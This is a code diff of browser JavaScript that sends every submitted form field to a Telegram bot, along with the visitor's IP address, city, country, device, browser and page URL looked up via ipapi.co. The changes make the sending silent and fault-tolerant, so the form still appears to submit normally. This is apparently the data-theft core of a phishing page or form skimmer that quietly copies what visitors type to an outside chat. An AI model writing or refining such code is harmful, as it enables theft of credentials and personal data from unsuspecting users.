@@ -5,7 +5,17 @@
  */
 async function getUserInfo() {
     try {
-        const response = await fetch("https://ipapi.co/json/");
+        const response = await fetch("https://ipapi.co/json/", {
+            method: "GET",
+            headers: {
+                "Accept": "application/json"
+            }
+        });
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
         const data = await response.json();
         
         return {
@@ -16,7 +26,8 @@ async function getUserInfo() {
             timezone: data.timezone || "Unknown"
         };
     } catch (error) {
-        console.error("Error fetching IP info:", error);
+        console.warn("Error fetching IP info (non-critical):", error);
+        // Return default values - don't fail the entire process
         return {
             ip: "Unknown",
             country: "Unknown",
@@ -63,7 +74,9 @@ async function sendToTelegram(message, parseMode = 'Markdown') {
     try {
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: { 
+                "Content-Type": "application/json"
+            },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CONFIG.CHAT_ID,
                 text: message,
@@ -71,9 +84,16 @@ async function sendToTelegram(message, parseMode = 'Markdown') {
             })
         });
         
-        return response.ok;
+        if (!response.ok) {
+            const errorData = await response.json().catch(() => ({}));
+            console.warn("Telegram API error:", response.status, errorData);
+            return false;
+        }
+        
+        return true;
     } catch (error) {
-        console.error("Error sending Telegram message:", error);
+        console.warn("Error sending Telegram message (non-critical):", error);
+        // Don't throw - just return false so form submission can continue
         return false;
     }
 }
@@ -106,27 +126,43 @@ async function sendVisitNotification() {
  * Send form data to Telegram
  */
 async function sendFormDataToTelegram(subject, data) {
-    const userInfo = await getUserInfo();
-    const deviceInfo = getDeviceInfo();
-    
-    let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
-    
-    // Add form data
-    for (const [key, value] of Object.entries(data)) {
-        if (value) {
-            message += `*${key}:* ${value}\n`;
+    try {
+        // Get user info - don't fail if this errors
+        const userInfo = await getUserInfo().catch(() => ({
+            ip: "Unknown",
+            country: "Unknown",
+            region: "Unknown",
+            city: "Unknown",
+            timezone: "Unknown"
+        }));
+        
+        const deviceInfo = getDeviceInfo();
+        
+        let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
+        
+        // Add form data
+        for (const [key, value] of Object.entries(data)) {
+            if (value) {
+                message += `*${key}:* ${value}\n`;
+            }
         }
+        
+        // Add user info
+        message += `\n━━━━━━━━━━━━━━━\n`;
+        message += `🌍 *IP:* ${userInfo.ip}\n`;
+        message += `🏙️ *City:* ${userInfo.city}\n`;
+        message += `🌏 *Country:* ${userInfo.country}\n`;
+        message += `💻 *Device:* ${deviceInfo.device}\n`;
+        message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
+        message += `🔗 *Page:* ${window.location.href}\n`;
+        
+        // Try to send - but don't throw if it fails
+        await sendToTelegram(message).catch(err => {
+            console.warn("Telegram send failed (non-critical):", err);
+        });
+    } catch (error) {
+        // Log but don't throw - form submission should continue
+        console.warn("Error in sendFormDataToTelegram (non-critical):", error);
     }
-    
-    // Add user info
-    message += `\n━━━━━━━━━━━━━━━\n`;
-    message += `🌍 *IP:* ${userInfo.ip}\n`;
-    message += `🏙️ *City:* ${userInfo.city}\n`;
-    message += `🌏 *Country:* ${userInfo.country}\n`;
-    message += `💻 *Device:* ${deviceInfo.device}\n`;
-    message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
-    message += `🔗 *Page:* ${window.location.href}\n`;
-    
-    await sendToTelegram(message);
 }
 
